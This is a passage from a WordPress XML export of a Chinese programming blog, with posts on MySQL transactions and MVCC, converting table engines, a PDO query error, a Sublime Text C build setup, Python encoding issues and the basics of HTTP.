一个事务必须被视为一个不可分割的最小工作单位，整个事务中的所有操作要么全部提交成功，要么全部失败回滚，对于一个事务来说，不可能只执行其中的一部分操作。这也就解开了本篇博文开头的疑问。
<blockquote>
<h3>C、一致性（consistency）</h3>
</blockquote>
数据库总是从一个一致性的状态转换到另一个一致性的状态。在前面的例子中，即使在执行第三、四条语句之间时系统崩溃，支票账户中也不会损失200元，储蓄帐户也不会多出200元。因为事务最终没有提交，如果所有语句都顺利执行完成，并且事务也提交成功，那么就转换到了另一个一致性。尤其是在进行多表update的时候，根据业务的操作，在更新前是一个一致性状态，更新成功后又是另一个一致性状态（因为更新后的数据结果就是预期的结果）。
<blockquote>
<h3>I、隔离性（isolation）</h3>
</blockquote>
通常来说，一个事务所做的修改在最终提交以前，对其他事务是不可见的，在前面的例子中，当执行完第三条语句，第四条语句还未开始时，此时有另外一个帐户汇总程序开始运行，则其看到的支票账户的额并没有减去200元。在下一篇博文中将理解讨论隔离级别（isolation level），那时你会发现为什么要说“同样来说”是不可见的。当然，关于隔离级别见这篇文章《<a title="Mysql事务以及隔离级别" href="http://www.veitor.net/article/319.html" target="_blank" rel="noopener noreferrer">Mysql事务以及隔离级别</a>》。
<blockquote>
<h3>D、持久性（durability）</h3>
</blockquote>
一旦事务提交，则其所做的修改就会永久保存到数据库中。此时系统崩溃也不会影响到已经修改的数据了。话说持久性是个模糊的概念，因为实际上持久性也分很多不同的级别。有些持久性策略能够提供非常强的安全保障，而有些未必。而且不可能有能做到100%的持久性保证的策略（<strong>如果数据库本身就能做到真正的持久性，那么还需要备份来增加持久性做什么呢？</strong>）.
&nbsp;
虽然事务的ACID特性可以增加事务处理过程中额外的安全性，但如同锁粒度的升级会增加系统开销一样（详见上一篇博文《<a title="了解mysql的并发控制" href="http://www.veitor.net/article/427.html" target="_blank" rel="noopener noreferrer">了解mysql的并发控制</a>》），这也会需要数据库系统做更多的工作。因此一个实现了ACID的数据库，相比没有实现ACID的数据库，通常会需要更强的CPU处理能力、更大的内存和更多的磁盘空间。当然用户可以根据业务是否需要事务处理，来选择合适的存储引擎。对于一些非事务性的存储引擎，可以获得更高的性能。
本篇重点理解ACID的概念，如有疑问，欢迎留言探讨。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>430</wp:post_id>
		<wp:post_date><![CDATA[2014-12-04 14:20:56]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-12-04 14:20:56]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e4%ba%86%e8%a7%a3mysql%e4%ba%8b%e5%8a%a1]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="acid"><![CDATA[ACID]]></category>
		<category domain="category" nicename="mysql-2"><![CDATA[Mysql]]></category>
		<category domain="post_tag" nicename="mysql"><![CDATA[mysql]]></category>
		<category domain="post_tag" nicename="%e4%ba%8b%e5%8a%a1"><![CDATA[事务]]></category>
						</item>
					<item>
		<title>了解mysql中多版本并发控制</title>
		<link>http://wp.veitor.net/2014/12/07/%e4%ba%86%e8%a7%a3mysql%e4%b8%ad%e5%a4%9a%e7%89%88%e6%9c%ac%e5%b9%b6%e5%8f%91%e6%8e%a7%e5%88%b6/</link>
		<pubDate>Sun, 07 Dec 2014 13:27:10 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=436</guid>
		<description></description>
		<content:encoded><![CDATA[前面写的一篇《<a title="了解mysql的并发控制" href="http://www.veitor.net/article/427.html" target="_blank" rel="noopener noreferrer">了解mysql的并发控制</a>》中了解了mysql的并发控制，主要是通过锁机制来控制并发的。控制严格的锁会影响性能，反之则影响数据安全性。而mysql的大多数事务性存储引擎实现的都不是简单的行级锁。基于提升并发性能的考虑，它们一般都同时实现了多版本并发控制（MVCC）。
<strong>可以认为MVCC是行级锁的一个变种，但是它在很多情况下避免了加锁操作，因此开销更低。虽然实现机制有所不同，但大都实现了非阻塞的读操作，写操作也只锁定必要的行。</strong>
MVCC的实现，是通过保存数据在某个时间点的快照来实现的。也就是说，不管需要执行多长时间，每个事务看到的数据都是一致的。下面就通过InnoDB的简化版行为说明MVCC是如何工作的：
InnoDB的MVCC，是通过在每行记录后面保存两个隐藏的列来实现的。这两个列，一个保存了行的创建时间，一个保存行的过期时间（也叫删除时间）。当然存储的并不是实际的时间值，而是系统的版本号。每开始一个新的事务，系统版本号都会自动递增。事务开始时刻的系统版本号作为事务的版本号，用来和查询到的每行记录的版本号进行比较。下面看一下在REPEATABLE READ（可重复读）隔离级别下，MVCC具体是如何操作的。
<blockquote>SELECT</blockquote>
InnoDB会根据以下两个条件检查每行记录：
a.InnoDB只查找版本早于当前事务版本的数据行（也就是，行的系统版本号小于或等于事务的系统版本号），这样可以确保事务的读取的行，要么是在事务开始前已经存在的，要么是事务自身插入或者修改过的。
b.行的删除版本要么未定义，要么大于当前事务版本号。这可以确保事务读取到的行，在事务开始之前未被删除。
<blockquote>INSERT</blockquote>
InnoDB为新插入的每一行保存当前系统版本号作为行版本号。
<blockquote>DELETE</blockquote>
InnoDB为删除的每一行保存保存当前系统版本号作为行删除标识。
<blockquote>UPDATE</blockquote>
InnoDB为插入一行新记录，保存当前系统版本号作为行版本号，同时保存当前系统版本号到原来的行作为删除标识。
&nbsp;
保存这两个额外系统版本号，使大多数读操作都都可以不用加锁。这样设计使得读数据操作很简单，性能很好，并且也能保证只会读取到符合标准的行。不足之处是每行记录都会需要额外的存储空间，需要做更多的行检查工作，以及一些额外的维护工作。
MVCC只在REPEATABLE READ和READ COMMITTED两个隔离级别下工作。其他两个隔离级别都和MVCC不兼容。因为READ UNCOMMITTED总是读取到最新的数据行（脏读），而不是符合当前事务版本的数据行。而SERIALIZABLE则会对所有读取的行都加锁。（这段内容需要了解mysql隔离级别，请看<a title="Mysql事务以及隔离级别" href="http://www.veitor.net/article/319.html" target="_blank" rel="noopener noreferrer">这篇文章</a>）
如果有疑问，欢迎留言探讨。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>436</wp:post_id>
		<wp:post_date><![CDATA[2014-12-07 13:27:10]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-12-07 13:27:10]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e4%ba%86%e8%a7%a3mysql%e4%b8%ad%e5%a4%9a%e7%89%88%e6%9c%ac%e5%b9%b6%e5%8f%91%e6%8e%a7%e5%88%b6]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mysql-2"><![CDATA[Mysql]]></category>
		<category domain="post_tag" nicename="mysql"><![CDATA[mysql]]></category>
		<category domain="post_tag" nicename="%e4%ba%8b%e5%8a%a1"><![CDATA[事务]]></category>
						</item>
					<item>
		<title>Mysql转换表的引擎的三种方法</title>
		<link>http://wp.veitor.net/2014/12/14/mysql%e8%bd%ac%e6%8d%a2%e8%a1%a8%e7%9a%84%e5%bc%95%e6%93%8e%e7%9a%84%e4%b8%89%e7%a7%8d%e6%96%b9%e6%b3%95/</link>
		<pubDate>Sun, 14 Dec 2014 07:37:11 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=439</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>ALTER TABLE</blockquote>
将表从一个引擎修改为另一个引擎最简单的办法就是使用ALTER TABLE语句。下面将mytable的引擎修改为InnoDB：
<pre class="lang:mysql decode:true ">mysql&gt; ALTER TABLE `mytable` ENGINE = InnoDB；</pre>
上述语法可以适用任何存储引擎。担忧一个问题：需要执行很长时间。Mysql会按行将数据从原表复制到一张新的表中，在赋值期间可能会小号系统所有的I\O能力，同时原表上会加上读锁。所以，在繁忙的表上执行此操作要特别小心。一个替代方案是采用下面的导出与导入的方法，手工进行表的复制。
<blockquote>导出与导入</blockquote>
为了更好的控制转换过程，可以使用mysqldump工具将数据导出到文件，然后修改文件中CREATE TABLE语句的存储引擎选项，注意同时修改表名，因为同一个数据库中不能存在相同的表名，即使它们使用的是不同的存储引擎。同时要注意mysqldump默认会子的那个在CREATE TABLE语句前加上DROP TABLE语句，不注意这一点可能会导致数据丢失。
<blockquote>创建与查询（CREATE和SELECT）</blockquote>
第三种转换的技术综合了第一种方法的高效和第二种方法的安全。不需要导出整个表的数据，而是先创建一个新的存储引擎的表，然后利用INSERT...SELECT语法来导数据：
<pre class="lang:mysql decode:true ">mysql&gt; CREATE TABLE `innodb_table` LIKE `myisam_table`;
mysql&gt; ALTER TABLE `innodb_table` ENGINE = InnoDB;
mysql&gt; INSERT INTO `innodb_table` SELECT * FROM `myisam_table`;</pre>
数据量不大的话，这样做工作的很好。如果数量很大，则可以考虑做分批处理，针对每一段数据执行事务提交操作，以避免大事务产生过多的undo。假设有主键字段id，重复运行以下语句（最小值x和最大值y进行相应的替换）将数据导入到新表：
<pre class="lang:mysql decode:true ">mysql&gt; START TRANSACTION;
mysql&gt; INSERT INTO `innodb_table` SELECT * FROM `myisam_tale` BETWEEN x AND y;
mysql&gt; COMMIT;</pre>
这样操作完成以后，新表示原表的一个全量复制，原表还在，如果需要可以删除原表，如果有表要，可以在执行的过程中对原表加锁，以确保新表和原表的数据一致。
&nbsp;
Percona Tolkit提供了一个pt-online-schema-change的工具（基于Facebook的在线schema变更技术），可以比较简单、方便的执行上述过程，避免手工操作可能导致的失误和繁琐。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>439</wp:post_id>
		<wp:post_date><![CDATA[2014-12-14 07:37:11]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-12-14 07:37:11]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[mysql%e8%bd%ac%e6%8d%a2%e8%a1%a8%e7%9a%84%e5%bc%95%e6%93%8e%e7%9a%84%e4%b8%89%e7%a7%8d%e6%96%b9%e6%b3%95]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mysql-2"><![CDATA[Mysql]]></category>
						</item>
					<item>
		<title>关于使用PDO无法执行两次查询的问题</title>
		<link>http://wp.veitor.net/2014/12/16/%e5%85%b3%e4%ba%8e%e4%bd%bf%e7%94%a8pdo%e6%97%a0%e6%b3%95%e6%89%a7%e8%a1%8c%e4%b8%a4%e6%ac%a1%e6%9f%a5%e8%af%a2%e7%9a%84%e9%97%ae%e9%a2%98/</link>
		<pubDate>Tue, 16 Dec 2014 13:38:41 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=445</guid>
		<description></description>
		<content:encoded><![CDATA[今天在使用PDO查询数据时遇到这么一个问题，使用实例化的PDO类无法执行两次查询，即第一次查询是正常的，第二次查询是无效的。
举个栗子：
<pre class="lang:php decode:true">$pdo = new PDO('mysql:host=127.0.0.1;dbname=test;', 'root', '');
$stmt1 = $pdo-&gt;query('select count(*） from table');
$stmt2 = $pdo-&gt;query('select * from table limit 0,5');</pre>
实例化PDO类，调用类中方法query查询一条语句“select count(*) from table”，返回的$stmt1变量是一个PDOStatement对象，而此时没有使用$stmt1这个实例做任何操作（或者只是使用了$stmt1-&gt;<a>fetchColumn</a><a>()获得了数据数量</a>）。接着再调用PDO实例中的方法query（使用prepare后再execute也一样）再一次查询数据，这是返回给$stmt2变量的值就不是一个PDOStatement对象了，而是false。使用$stmt2-&gt;errorInfo();打印出结果可以看到这么个错误“Cannot execute queries while other unbuffered queries are active.  Consider using PDOStatement::fetchAll().  Alternatively, if your code is only ever going to run against mysql, you may enable query buffering by setting the PDO::MYSQL_ATTR_USE_BUFFERED_QUERY attribute”
大致意思是说，当一个未缓存查询正在活动时不能再执行查询操作。解决方式有：
1、可以考虑使用前一个查询返回的PDOStatement对象（本例子中是$stmt1）中fetchAll方法把数据处理完毕
2、亦或者是将前一个查询PDOStatement对象设为null：$stmt1=null
3、再或者是连接数据库后使用PDO实例中方法<span class="lang:mysql decode:true  crayon-inline ">$pdo-&gt;setAttribute(PDO::MYSQL_ATTR_USE_BUFFERED_QUERY, true);</span> 设置mysql启用缓冲查询。
这时第二次查询时$stmt2就不会为false了。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>445</wp:post_id>
		<wp:post_date><![CDATA[2014-12-16 13:38:41]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-12-16 13:38:41]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%85%b3%e4%ba%8e%e4%bd%bf%e7%94%a8pdo%e6%97%a0%e6%b3%95%e6%89%a7%e8%a1%8c%e4%b8%a4%e6%ac%a1%e6%9f%a5%e8%af%a2%e7%9a%84%e9%97%ae%e9%a2%98]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mysql-2"><![CDATA[Mysql]]></category>
		<category domain="post_tag" nicename="mysql"><![CDATA[mysql]]></category>
		<category domain="post_tag" nicename="pdo"><![CDATA[PDO]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="bianchengyuyan"><![CDATA[编程语言]]></category>
						</item>
					<item>
		<title>sublime下配置编译和运行C程序</title>
		<link>http://wp.veitor.net/2014/12/19/sublime%e4%b8%8b%e9%85%8d%e7%bd%ae%e7%bc%96%e8%af%91%e5%92%8c%e8%bf%90%e8%a1%8cc%e7%a8%8b%e5%ba%8f/</link>
		<pubDate>Fri, 19 Dec 2014 07:26:45 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=447</guid>
		<description></description>
		<content:encoded><![CDATA[我使用的是sublime3，首先下载MinGW，别问我是啥，我也不怎么了解，网上说 MinGW 提供了一套简单方便的Windows下的基于GCC 程序开发环境，提供了GNU工具集。在这里我就理解它提供了gcc、g++、make等编译器吧。具体自行了解。
你可以上minGW官网http://www.mingw.org/或其他地方可以下载到，可视化安装界面，自行选择目录安装。比如我安装到了D:\minGW
安装完毕后，将minGW安装目录下的bin目录添加到环境变量，如下图，我将D:\minGW\bin添加到环境变量
<p style="text-align: center;"><a href="http://storage.veitor.net/uploads/2014/12/QQ图片20141219150247.jpg" target="_blank" rel="noopener noreferrer"><img class="aligncenter  wp-image-448" alt="QQ图片20141219150247" src="http://storage.veitor.net/uploads/2014/12/QQ图片20141219150247.jpg" width="540" height="360" /></a></p>
<p style="text-align: center;"></p>
<p style="text-align: left;">接着配置sublime，工具栏选择工具（tools）-编译系统，然后新建一个编译系统</p>
<p style="text-align: left;"><a href="http://storage.veitor.net/uploads/2014/12/QQ图片20141219150736.jpg"><img class="aligncenter size-full wp-image-449" alt="QQ图片20141219150736" src="http://storage.veitor.net/uploads/2014/12/QQ图片20141219150736.jpg" width="429" height="427" /></a>输入以下配置：</p>
<pre class="lang:php decode:true">{
	"shell_cmd": "gcc \"${file}\" -o \"${file_path}/${file_base_name}\" -std=c11 -O2 -Wall -lm --static",
	"file_regex": "^(..[^:]*):([0-9]+):?([0-9]+)?:? (.*)$",
	"working_dir": "${file_path}",
	"selector": "source.c, source.c++",
	"variants":
	[
		{
			"name": "Run",
			"shell_cmd": "gcc -std=c11 -O2 -Wall -lm --static \"${file}\" -o \"${file_path}/${file_base_name}\" &amp;&amp; \"${file_path}/${file_base_name}\""
		}
	]
}</pre>
保存在Sublime Text的Packages目录下即可。
然后敲一段C程序然后保存为.c文件，按ctrl+B会在这文件旁生成exe程序，按ctrl+shift+B会在sublime控制台中显示运行结果（如下图）
<a href="http://storage.veitor.net/uploads/2014/12/QQ图片20141219152044.jpg"><img class="aligncenter size-full wp-image-450" alt="QQ图片20141219152044" src="http://storage.veitor.net/uploads/2014/12/QQ图片20141219152044.jpg" width="497" height="619" /></a>
&nbsp;
至此大功告成。
<p style="text-align: left;"></p>
<p style="text-align: center;"></p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>447</wp:post_id>
		<wp:post_date><![CDATA[2014-12-19 07:26:45]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-12-19 07:26:45]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[sublime%e4%b8%8b%e9%85%8d%e7%bd%ae%e7%bc%96%e8%af%91%e5%92%8c%e8%bf%90%e8%a1%8cc%e7%a8%8b%e5%ba%8f]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="c"><![CDATA[C]]></category>
		<category domain="post_tag" nicename="sublime"><![CDATA[sublime]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
						</item>
					<item>
		<title>关于python提示no module named win32api问题的解决</title>
		<link>http://wp.veitor.net/2014/12/22/%e5%85%b3%e4%ba%8epython%e6%8f%90%e7%a4%bano-module-named-win32api%e9%97%ae%e9%a2%98%e7%9a%84%e8%a7%a3%e5%86%b3/</link>
		<pubDate>Mon, 22 Dec 2014 08:34:42 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=452</guid>
		<description></description>
		<content:encoded><![CDATA[本篇只介绍对于本机环境下问题的解决方案。我的系统是Win7 64位，并且安装的是64位的python2.7.6版本
当提示“no module named win32api”该信息时，需要安装pywin32模块，原本我是想通过pip安装的，但有问题。
于是上网找了对应的安装包，对应于我的python版本的，如果你也是用的2.7.6 64位的，可以下载我提供的这个附件：<a href="http://www.veitor.net/article/452.html/pywin32-218-win-amd64-py2-7" rel="attachment wp-att-454">pywin32-218.win-amd64-py2.7</a> 然后进行安装，如果打开程序安装报错的话，很有可能是找不到python的注册表信息，我的解决方法是重新安装python（当然也有写个脚本进行注册的方法），重装时选择只对本机用户，而不是所有用户。完成后就能成功安装pywin32了。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>452</wp:post_id>
		<wp:post_date><![CDATA[2014-12-22 08:34:42]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-12-22 08:34:42]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%85%b3%e4%ba%8epython%e6%8f%90%e7%a4%bano-module-named-win32api%e9%97%ae%e9%a2%98%e7%9a%84%e8%a7%a3%e5%86%b3]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="python"><![CDATA[python]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
						<wp:comment>
			<wp:comment_id>20</wp:comment_id>
			<wp:comment_author><![CDATA[Simon]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[simon19930211@gmail.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[61.160.251.57]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2018-04-14 07:25:29]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2018-04-14 07:25:29]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[附件下载不了了]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>Python乱码问题解决方法</title>
		<link>http://wp.veitor.net/2015/01/06/python%e4%b9%b1%e7%a0%81%e9%97%ae%e9%a2%98%e8%a7%a3%e5%86%b3%e6%96%b9%e6%b3%95/</link>
		<pubDate>Tue, 06 Jan 2015 01:46:19 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=459</guid>
		<description></description>
		<content:encoded><![CDATA[最近要写个python脚本，遇到各种乱码问题，后来一查原来python乱码问题还真是层出不穷，让人头疼啊。
我主要是用的sublime进行脚本编写，使用cmd或python自带的GUI运行脚本调试查看。
比如下列的脚本代码在运行时会产生乱码
<pre class="lang:python decode:true">#coding:utf-8
print "的是"</pre>
<p style="text-align: left;"><a href="http://storage.veitor.net/uploads/2015/01/QQ截图20150106092343.jpg" target="_blank" rel="noopener noreferrer"><img class="aligncenter  wp-image-460" alt="QQ截图20150106092343" src="http://storage.veitor.net/uploads/2015/01/QQ截图20150106092343.jpg" width="1096" height="187" /></a>因为编写代码时保存的编码为UTF-8，而在Windows中运行读取脚本时以系统的编码GBK去执行，因此GBK与UTF-8冲突导致编码错误。</p>
<p style="text-align: left;">解决方法有三种：</p>
<blockquote>
<p style="text-align: left;">1、我们往往在代码顶部加入<span class="lang:python decode:true crayon-inline">#coding:utf-8</span> 这样指明解码时的字符集，而指明utf-8还是会出现所说的乱码，还是因为运行时采用的GBK与我们指定的UTF-8冲突。所以要指明编码的话就只好指明为和系统编码一样的字符集，如这样指明<span class="lang:python decode:true  crayon-inline ">#coding:gbk</span> ，不写coding的话默认为与系统一样的编码</p>
<p style="text-align: center;"><a href="http://storage.veitor.net/uploads/2015/01/QQ截图20150106094006.jpg" target="_blank" rel="noopener noreferrer"><img class="aligncenter  wp-image-461" alt="QQ截图20150106094006" src="http://storage.veitor.net/uploads/2015/01/QQ截图20150106094006.jpg" width="539" height="202" /></a></p>
<p style="text-align: left;">2、在打印的字符前加上u，如<span class="lang:python decode:true  crayon-inline ">print u"是"</span> ，这样就指明了使用头部coding指定的字符集解码，当然前提是要在头部添加coding，并且coding所指的的字符集与操作系统用的字符集一样（刚才第一条说明了）</p>
<p style="text-align: center;"><a href="http://storage.veitor.net/uploads/2015/01/QQ截图20150106094135.jpg" target="_blank" rel="noopener noreferrer"><img class="aligncenter  wp-image-462" alt="QQ截图20150106094135" src="http://storage.veitor.net/uploads/2015/01/QQ截图20150106094135.jpg" width="493" height="151" /></a></p>
<p style="text-align: left;">3、输出时指定使用的字符集，如<span class="lang:python decode:true  crayon-inline ">print '是'.decode('utf-8')</span></p>
<p style="text-align: center;"><a href="http://storage.veitor.net/uploads/2015/01/QQ截图20150106094339.jpg" target="_blank" rel="noopener noreferrer"><img class="aligncenter  wp-image-463" alt="QQ截图20150106094339" src="http://storage.veitor.net/uploads/2015/01/QQ截图20150106094339.jpg" width="583" height="175" /></a></p>
</blockquote>
当然保存脚本时的编码要与coding一样。
另外据说还有种方法是加入这三行代码：
<pre class="lang:python decode:true ">import sys
reload(sys)
sys.setdefaultencoding('utf-8')</pre>
这种方法我没试过，看起来好像是从系统编码进行下手的，将系统编码临时改掉，这样的话你们懂的。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>459</wp:post_id>
		<wp:post_date><![CDATA[2015-01-06 01:46:19]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-01-06 01:46:19]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[python%e4%b9%b1%e7%a0%81%e9%97%ae%e9%a2%98%e8%a7%a3%e5%86%b3%e6%96%b9%e6%b3%95]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="python-bianchengyuyan"><![CDATA[Python]]></category>
		<category domain="post_tag" nicename="python"><![CDATA[python]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
		<category domain="post_tag" nicename="%e7%bc%96%e7%a0%81"><![CDATA[编码]]></category>
		<category domain="category" nicename="bianchengyuyan"><![CDATA[编程语言]]></category>
						</item>
					<item>
		<title>HTTP协议是如何工作的</title>
		<link>http://wp.veitor.net/2015/01/06/http%e5%8d%8f%e8%ae%ae%e6%98%af%e5%a6%82%e4%bd%95%e5%b7%a5%e4%bd%9c%e7%9a%84/</link>
		<pubDate>Tue, 06 Jan 2015 14:44:24 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=466</guid>
		<description></description>
		<content:encoded><![CDATA[浏览网页时HTTP协议的主要应用，但是这并不代表HTTP协议就只能应用于网页的浏览，只要通信的双方都遵守HTTP协议，其就有用武之地。比如腾讯QQ、迅雷等软件都是用HTTP协议（当然还包括其他的协议）。
那么HTTP协议是如何工作的呢？
首先，客户端发送一个请求给服务器，服务器在接收到这个请求后将生成响应返回给客户端。一次HTTP操作成为一个事务，其工作过程可分为四步：
1、客户机与服务器需要建立连接，单击某个超链接，HTTP协议的工作开始。
2、建立连接后，客户机发送一个请求给服务器。格式为：前边是统一资源标识符（URL）、中间是协议版本号，后边是MIME信息（包括请求修饰符、客户机信息和可能的内容）
3、服务器接收到请求后，给予相应的相应信息。格式为：首先是一个状态行（包括信息的协议版本号、一个成功或错误的代码），然后是MIME信息（包括服务器信息、实体信息和可能的内容）
4、客户端接收服务器返回的信息并显示在用户的显示屏上，然后客户机与服务器断开连接。
&nbsp;
如果以上过程中的某一步出现错误，产生错误的信息将返回到客户端，有显示屏输出。对于用户来说，这些过程是由HTTP协议自己完成的，用户只要用鼠标点击等待信息显示就可以了。
<blockquote><strong>请求</strong></blockquote>
HTTP请求由三部分组成：请求行、消息报头、请求正文。请求行以一个请求方式符号开头，以空格分开，后面跟着请求的URI和协议的版本，格式为：Method Request-URI HTTP-Version CRLF
&nbsp;
比如我请求本站某页面：http://www.veitor.net/cate/bianchengyuyan
请求行如图
<a href="http://storage.veitor.net/uploads/2015/01/QQ截图20150106220345.jpg"><img class="aligncenter size-full wp-image-467" alt="QQ截图20150106220345" src="http://storage.veitor.net/uploads/2015/01/QQ截图20150106220345.jpg" width="1134" height="232" /></a>
参数说明：
<ul>
	<li>Method：请求方法。截图中为GET。</li>
	<li>Request-URI：一个统一资源标识符，截图中为/cate/bianchengyuyan</li>
	<li>HTTP-Version：请求的HTTP协议版本，截图中为1.1</li>
	<li>CRLF：回车和换行符</li>
</ul>
<blockquote><strong>响应</strong></blockquote>
在接收和解释请求消息后，服务器返回一个HTTP响应消息。HTTP相应也由三个部分组成。分别是：状态行、消息报头、响应正文。状态行格式为：HTTP-Version Status-Code Reason-Phrase CRLF
比如我请求本站某页面：http://www.veitor.net/cate/bianchengyuyan
<a href="http://storage.veitor.net/uploads/2015/01/QQ截图20150106221255.jpg"><img class="aligncenter size-full wp-image-468" alt="QQ截图20150106221255" src="http://storage.veitor.net/uploads/2015/01/QQ截图20150106221255.jpg" width="397" height="220" /></a>
&nbsp;
参数说明如下：
<ul>
	<li>HTTP-Version：服务器HTTP协议的版本，截图中为1.1</li>
	<li>Status-Code：服务器发回的响应状态码，截图中为200</li>
	<li>Reason-Phrase：状态代码的文本描述，截图中为OK</li>
</ul>
其中状态代码由三位数字组成，第一个数字定义了响应的类别，有五种可能取值：
<ol>
	<li>1xx：指示信息——请求已接收，继续处理。</li>
	<li>2xx：成功——请求已被成功接收、理解、接受</li>
	<li>3xx：重定向——要完成请求必须进行更进一步的操作</li>
	<li>4xx：客户端错误——请求有语法错误或请求无法实现</li>
	<li>5xx：服务器错误——服务器未能实现合法的请求</li>
</ol>
